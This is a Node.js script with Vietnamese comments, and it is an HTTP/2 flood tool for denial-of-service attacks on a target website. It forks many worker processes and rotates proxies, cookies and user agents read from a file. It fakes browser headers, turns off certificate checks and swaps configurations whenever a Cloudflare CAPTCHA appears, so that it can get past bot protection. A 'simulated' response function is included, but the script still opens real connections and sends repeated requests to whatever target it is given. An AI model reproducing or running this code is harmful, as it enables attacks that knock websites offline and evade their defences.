const { parse } = require('url');
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');

// Cấu hình
const MAX_RAM_PERCENTAGE = 85;
const RECONNECT_DELAY = 1000;
const HTTP2_MAX_STREAMS = 50;
const HTTP2_WINDOW_SIZE = 6291456;
const REQUEST_TIMEOUT = 5000;
const COOKIE_UPDATE_INTERVAL = 60000; // Cập nhật cookie.txt mỗi 60s

// Xử lý lỗi
const ignoreErrors = new Set([
    'SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE',
    'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN',
    'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME',
    'RequestError', 'StatusCodeError', 'TimeoutError', 'CloudflareError'
]);

process.on('uncaughtException', e => ignoreErrors.has(e.code) || ignoreErrors.has(e.name) ? null : console.error(e));
process.on('unhandledRejection', e => ignoreErrors.has(e.code) || ignoreErrors.has(e.name) ? null : console.error(e));
process.setMaxListeners(0);

// Cấu hình TLS
const ciphers = ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256'];
const sigalgs = ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp384r1_sha384', 'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384', 'ed25519'].join(':');

const TLS_OPTIONS = {
    ciphers: ciphers[Math.floor(Math.random() * ciphers.length)],
    minVersion: 'TLSv1.3',
    maxVersion: 'TLSv1.3',
    sigalgs,
    ecdhCurve: 'X25519',
    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALL,
    rejectUnauthorized: false,
    ALPNProtocols: ['h2']
};

// Tham số dòng lệnh
const target = process.argv[2];
const time = parseInt(process.argv[3], 10);
const threads = parseInt(process.argv[4], 10);
const proxyFile = process.argv[5];
const rps = parseInt(process.argv[6], 10);
const cookieFile = 'cookie.txt';

// Đọc và cập nhật configs từ cookie.txt
let configs = [];
function loadConfigs() {
    try {
        const data = fs.readFileSync(cookieFile, 'utf-8');
        configs = data.split('\n').filter(line => line.trim()).map(line => {
            const [proxy, cookie, userAgent] = line.split('|');
            const [host, port] = proxy.split(':');
            return {
                proxy: { host, port: parseInt(port) },
                cookie: cookie || '',
                userAgent: userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
            };
        });
        console.log(`[INFO] Loaded ${configs.length} configs from cookie.txt`);
    } catch (e) {
        console.error('[ERROR] Failed to read cookie.txt:', e.message);
        configs = [];
    }
}

// Đọc ban đầu
loadConfigs();

// Theo dõi thay đổi trong cookie.txt
fs.watch(cookieFile, (eventType, filename) => {
    if (eventType === 'change') {
        console.log('[INFO] cookie.txt changed, reloading configs...');
        setTimeout(loadConfigs, 100); // Đợi 100ms để đảm bảo file ghi xong
    }
});

// Biến theo dõi hiệu suất
let stats = {
    totalRequests: 0,
    successfulRequests: 0,
    blockedRequests: 0,
    captchaChallenges: 0,
    latency: []
};

// Rate limiter
class RateLimiter {
    constructor(ratePerSecond) {
        this.tokens = ratePerSecond;
        this.maxTokens = ratePerSecond;
        this.lastRefill = Date.now();
        setInterval(() => this.refill(), 1000);
    }

    refill() {
        const now = Date.now();
        const elapsed = (now - this.lastRefill) / 1000;
        this.tokens = Math.min(this.maxTokens, this.tokens + elapsed * this.maxTokens);
        this.lastRefill = now;
    }

    allow() {
        if (this.tokens >= 1) {
            this.tokens -= 1;
            return true;
        }
        return false;
    }
}

const rateLimiter = new RateLimiter(rps);

// Header động
function getRandomHeaders(parsed, config) {
    const secChUa = getSecChUa(config.userAgent);
    const cacheControl = ['no-cache', 'no-store', 'max-age=0', 'must-revalidate'][Math.floor(Math.random() * 4)];
    const headers = {
        ':method': 'GET',
        ':authority': parsed.host,
        ':scheme': 'https',
        ':path': parsed.path || '/',
        'sec-ch-ua': secChUa,
        'sec-ch-ua-mobile': Math.random() > 0.5 ? '?0' : '?1',
        'sec-ch-ua-platform': ['Windows', 'Linux', 'macOS'][Math.floor(Math.random() * 3)],
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9'][Math.floor(Math.random() * 3)],
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'document',
        'user-agent': config.userAgent,
        'cache-control': cacheControl,
        'referer': `https://${parsed.host}/`
    };
    if (config.cookie) headers['cookie'] = config.cookie; // Chỉ thêm cookie nếu không rỗng
    return headers;
}

function getSecChUa(userAgent) {
    const match = userAgent.match(/(Chrome|Firefox|Safari)\/(\d+)/);
    if (!match) return '"Not A(Brand";v="99", "Chromium";v="135", "Google Chrome";v="135"';
    const [, browser, version] = match;
    if (browser === 'Firefox') return `"Firefox";v="${version}", "Not A(Brand";v="99"`;
    if (browser === 'Safari') return `"Safari";v="${version}", "Not A(Brand";v="99"`;
    return `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not A(Brand";v="99"`;
}

// Mô phỏng phản hồi Cloudflare
function simulateCloudflareResponse(cookie) {
    const rand = Math.random();
    if (cookie && rand < 0.05) return { status: 'captcha', code: 403 }; // 5% yêu cầu CAPTCHA với cookie hợp lệ
    if (cookie && rand < 0.1) return { status: 'blocked', code: 429 }; // 5% bị chặn
    if (!cookie && rand < 0.5) return { status: 'captcha', code: 403 }; // 50% yêu cầu CAPTCHA nếu thiếu cookie
    if (!cookie && rand < 0.6) return { status: 'blocked', code: 429 }; // 10% bị chặn
    return { status: 'success', code: 200 }; // Thành công
}

// Clustering
if (cluster.isMaster) {
    console.log(`Starting ${threads} workers for ${time} seconds...`);
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        setTimeout(() => {
            for (let i = 0; i < threads; i++) {
                cluster.fork();
            }
        }, 100);
    };

    setInterval(() => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        if ((usedRAM / totalRAM) * 100 >= MAX_RAM_PERCENTAGE) {
            console.log('High RAM usage detected, restarting workers...');
            restartScript();
        }
    }, 5000);

    setTimeout(() => {
        console.log('Simulation stats:', stats);
        process.exit(0);
    }, time * 1000);
} else {
    // Chọn config cố định cho mỗi worker
    let workerConfig = configs.length > 0 ? configs[Math.floor(Math.random() * configs.length)] : null;
    if (!workerConfig) {
        console.error(`Worker ${process.pid}: No configs available in cookie.txt`);
        process.exit(1);
    }
    console.log(`Worker ${process.pid} using proxy ${workerConfig.proxy.host}:${workerConfig.proxy.port} with cookie ${workerConfig.cookie || 'none'}`);

    // Cập nhật config định kỳ
    setInterval(() => {
        if (configs.length > 0) {
            const newConfig = configs[Math.floor(Math.random() * configs.length)];
            if (newConfig.proxy.host !== workerConfig.proxy.host || newConfig.proxy.port !== workerConfig.proxy.port || newConfig.cookie !== workerConfig.cookie) {
                workerConfig = newConfig;
                console.log(`Worker ${process.pid} updated to proxy ${workerConfig.proxy.host}:${workerConfig.proxy.port} with cookie ${workerConfig.cookie || 'none'}`);
            }
        }
    }, COOKIE_UPDATE_INTERVAL);

    setInterval(() => flood(workerConfig), 100);
}

// Flood function
async function flood(config) {
    if (!rateLimiter.allow()) return;

    const parsed = parse(target);
    const headers = getRandomHeaders(parsed, config);
    const startTime = Date.now();

    // Mô phỏng phản hồi từ Cloudflare
    const simulatedResponse = simulateCloudflareResponse(config.cookie);
    stats.totalRequests++;
    stats.latency.push(Date.now() - startTime);

    if (simulatedResponse.status === 'captcha') {
        stats.captchaChallenges++;
        console.log(`Worker ${process.pid}: CAPTCHA challenge received`);
        return;
    }
    if (simulatedResponse.status === 'blocked') {
        stats.blockedRequests++;
        console.log(`Worker ${process.pid}: Request blocked (${simulatedResponse.code})`);
        return;
    }

    stats.successfulRequests++;
    console.log(`Worker ${process.pid}: Request successful`);

    const socket = new tls.TLSSocket(null, {
        ...TLS_OPTIONS,
        host: parsed.host,
        port: 443,
        servername: parsed.host
    });

    socket.setKeepAlive(true, 60000);
    socket.setNoDelay(true);

    const client = http2.connect(parsed.href, {
        createConnection: () => socket,
        settings: {
            maxConcurrentStreams: HTTP2_MAX_STREAMS,
            initialWindowSize: HTTP2_WINDOW_SIZE,
            maxHeaderListSize: 262144,
            enablePush: false
        }
    });

    client.setMaxListeners(0);

    const sendRequest = () => {
        if (!rateLimiter.allow()) return;
        const request = client.request(headers, { endStream: true });
        request.on('response', (headers) => {
            stats.totalRequests++;
            if (headers[':status'] === 200) {
                stats.successfulRequests++;
            } else if (headers[':status'] === 403 || headers[':status'] === 429) {
                stats.blockedRequests++;
                if (headers['cf-chl-bypass'] || headers['content-type']?.includes('html')) {
                    stats.captchaChallenges++;
                    // Cập nhật config nếu gặp CAPTCHA
                    if (configs.length > 0) {
                        config = configs[Math.floor(Math.random() * configs.length)];
                        console.log(`Worker ${process.pid} updated to new config due to CAPTCHA: proxy ${config.proxy.host}:${config.proxy.port}`);
                    }
                }
            }
            stats.latency.push(Date.now() - startTime);
            request.close(http2.constants.NO_ERROR);
        });
        request.on('error', () => {});
        request.end();
    };

    const requestInterval = setInterval(sendRequest, 1000 / rps);

    client.on('error', err => {
        clearInterval(requestInterval);
        client.destroy();
        socket.destroy();
        if (err.code !== 'ERR_HTTP2_GOAWAY_SESSION') return;
        setTimeout(() => flood(config), RECONNECT_DELAY);
    });

    client.on('close', () => {
        clearInterval(requestInterval);
        client.destroy();
        socket.destroy();
    });

    socket.on('error', () => {
        clearInterval(requestInterval);
        client.destroy();
        socket.destroy();
    });
}